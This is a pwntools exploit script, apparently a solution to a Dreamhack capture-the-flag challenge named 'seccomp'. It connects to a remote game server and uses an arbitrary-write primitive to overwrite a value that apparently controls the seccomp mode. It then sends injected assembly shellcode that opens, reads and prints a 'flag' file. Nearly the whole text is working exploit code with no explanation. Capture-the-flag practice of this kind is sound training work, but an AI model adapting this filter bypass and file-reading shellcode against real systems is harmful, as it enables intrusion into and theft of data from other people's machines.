#!/usr/bin/python3

from pwn import *

#p = process("./seccomp")
p = remote("host1.dreamhack.games", 10683)
e = ELF("./seccomp")
context.arch = 'amd64'

sla = lambda t, s: p.sendlineafter(t, s)

def write(shellcode):
    sla("> ", str(1))
    sla(": ", shellcode)

def excute():
    sla("> ", str(2))

def aaw(address, value):
    sla("> ", str(3))
    sla(": ", str(address))
    sla(": ", str(value))

# create shellcode
sc = asm("mov rdi, 0x67616c66")
sc += asm("push rdi")
sc += asm("mov rdi, rsp")
sc += asm("xor rsi, rsi")
sc += asm("mov rdx, 0xff")
sc += asm("mov rax, 0x2")
sc += asm("syscall")
#----------# open flag file

sc += asm("mov rdi, rax")
sc += asm("mov rsi, {}".format(hex(e.bss() + 0x28)))
sc += asm("mov rdx, 0xff")
sc += asm("xor rax, rax")
sc += asm("syscall")
#----------# read content of flag file in bss

sc += asm("mov rdi, 0x1")
sc += asm("mov rsi, {}".format(hex(e.bss() + 0x28)))
sc += asm("mov rdx, 0xff")
sc += asm("mov rax, 0x1")
sc += asm("syscall")
#----------# write flag

aaw(0x602090, 0x2)
write(sc)
excute()

p.sendline("flag")

p.interactive()
